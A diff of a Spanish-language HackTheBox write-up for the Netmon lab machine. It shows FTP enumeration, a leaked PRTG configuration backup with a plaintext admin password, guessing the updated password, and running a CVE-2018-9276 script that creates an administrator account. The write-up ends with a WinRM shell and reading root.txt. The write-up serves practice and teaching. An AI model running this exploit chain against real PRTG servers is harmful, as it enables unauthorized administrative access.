@@ -200,9 +200,11 @@ Aquí lo ideal sería buscar el archivo de configuración de este servicio para 
 40d1ce8bb6b274051bf...
 ```
 
+### PRTG Configuration Archive
+
 Si usamos `ls -a` para ver archivos/directorios ocultos vemos lo siguiente:
 
-```
+```bash wrap=false
 ftp> ls -a
 229 Entering Extended Passive Mode (|||59450|)
 125 Data connection already open; Transfer starting.
@@ -225,21 +227,180 @@ ftp> ls -a
 ftp> 
 ```
 
-Si nos metemos en `ProgramData`
+Si nos metemos en `ProgramData`:
+
+```bash wrap=false
+ftp> cd ProgramData
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||59582|)
+150 Opening ASCII mode data connection.
+12-15-21  10:40AM       <DIR>          Corefig
+02-03-19  12:15AM       <DIR>          Licenses
+11-20-16  10:36PM       <DIR>          Microsoft
+02-03-19  12:18AM       <DIR>          Paessler
+02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
+07-16-16  09:18AM       <DIR>          SoftwareDistribution
+02-03-19  12:15AM       <DIR>          TEMP
+11-20-16  10:19PM       <DIR>          USOPrivate
+11-20-16  10:19PM       <DIR>          USOShared
+02-25-19  10:56PM       <DIR>          VMware
+226 Transfer complete.
+ftp> cd Paessler
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||59584|)
+125 Data connection already open; Transfer starting.
+09-20-25  04:14AM       <DIR>          PRTG Network Monitor
+226 Transfer complete.
+ftp> cd PRTG\ Network\ Monitor
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||59586|)
+125 Data connection already open; Transfer starting.
+09-19-25  05:44PM       <DIR>          Configuration Auto-Backups
+09-19-25  08:00PM       <DIR>          Log Database
+02-03-19  12:18AM       <DIR>          Logs (Debug)
+02-03-19  12:18AM       <DIR>          Logs (Sensors)
+02-03-19  12:18AM       <DIR>          Logs (System)
+09-20-25  12:00AM       <DIR>          Logs (Web Server)
+09-19-25  08:00PM       <DIR>          Monitoring Database
+02-25-19  10:54PM              1189697 PRTG Configuration.dat
+02-25-19  10:54PM              1189697 PRTG Configuration.old
+07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
+09-20-25  04:14AM              1719982 PRTG Graph Data Cache.dat
+02-25-19  11:00PM       <DIR>          Report PDFs
+02-03-19  12:18AM       <DIR>          System Information Database
+02-03-19  12:40AM       <DIR>          Ticket Database
+02-03-19  12:18AM       <DIR>          ToDo Database
+226 Transfer complete.
+ftp> 
+```
+
+La clave está en el archivo `PRTG Configuration.old.bak` en donde encontraremos lo siguiente:
+
+```xml wrap=false title="PRTG Configuration.old.bak"
+<dbpassword>
+  <!-- User: prtgadmin -->
+  PrTg@dmin2018
+</dbpassword>
+```
+
+Pero si nos intentamos loguear no nos deja. Si nos fijamos el año de la contraseña es **2018** y la máquina es de **2019**, si probamos a cambiar eso:
+
+![PRTG Login Successful](./2.png)
+
+## Explotación
  
+Si ahora usamos el **exploit** que encontramos antes nos creará un usuario con privilegios de **administrador**:
+
+```bash wrap=false
+❯ ./rce.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0NDNUMxMTJCLTU4NzEtNDMxRC05MTVELTQ0RjczMEI0RDMzQn0%3D; Path=/; HttpOnly"
+
+[+]#########################################################################[+] 
+[*] Authenticated PRTG network Monitor remote code execution                [*] 
+[+]#########################################################################[+] 
+[*] Date: 11/03/2019                                                        [*] 
+[+]#########################################################################[+] 
+[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
+[+]#########################################################################[+] 
+[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
+[*] Version: 18.2.38                                                        [*] 
+[*] CVE: CVE-2018-9276                                                      [*] 
+[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
+[+]#########################################################################[+] 
+
+# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 
+
+[+]#########################################################################[+] 
+
+ [*] file created 
+ [*] sending notification wait....
+
+ [*] adding a new user 'pentest' with password 'P3nT3st' 
+ [*] sending notification wait....
+
+ [*] adding a user pentest to the administrators group 
+ [*] sending notification wait....
 
 
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
+```
+
+Vamos a comprobarlo:
+
+```bash wrap=false
+❯ crackmapexec winrm 10.10.10.152 -u 'pentest' -p 'P3nT3st!'
+SMB         10.10.10.152    5985   NETMON           [*] Windows 10 / Server 2016 Build 14393 (name:NETMON) (domain:netmon)
+HTTP        10.10.10.152    5985   NETMON           [*] http://10.10.10.152:5985/wsman
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.10.152    5985   NETMON           [+] netmon\pentest:P3nT3st! (Pwn3d!)
+❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'P3nT3st!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\pentest\Documents> whoami
+netmon\pentest
+*Evil-WinRM* PS C:\Users\pentest\Documents> cd ..
+*Evil-WinRM* PS C:\Users\pentest> cd ..
+*Evil-WinRM* PS C:\Users> dir
 
 
+    Directory: C:\Users
 
 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/25/2019  10:44 PM                Administrator
+d-----        9/20/2025   4:48 AM                pentest
+d-r---        9/20/2025   4:46 AM                Public
 
 
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> dir
 
 
+    Directory: C:\Users\Administrator
 
 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         2/3/2019   7:08 AM                Contacts
+d-r---         2/2/2019  11:35 PM                Desktop
+d-r---         2/3/2019   7:08 AM                Documents
+d-r---         2/3/2019   7:08 AM                Downloads
+d-r---         2/3/2019   7:08 AM                Favorites
+d-r---         2/3/2019   7:08 AM                Links
+d-r---         2/3/2019   7:08 AM                Music
+d-r---         2/3/2019   7:08 AM                Pictures
+d-r---         2/3/2019   7:08 AM                Saved Games
+d-r---         2/3/2019   7:08 AM                Searches
+d-r---        2/25/2019  10:06 PM                Videos
 
-[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/142)
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        9/19/2025   5:03 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+b008c657ce1821d3b...
+```
+
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/177)
 
 ---
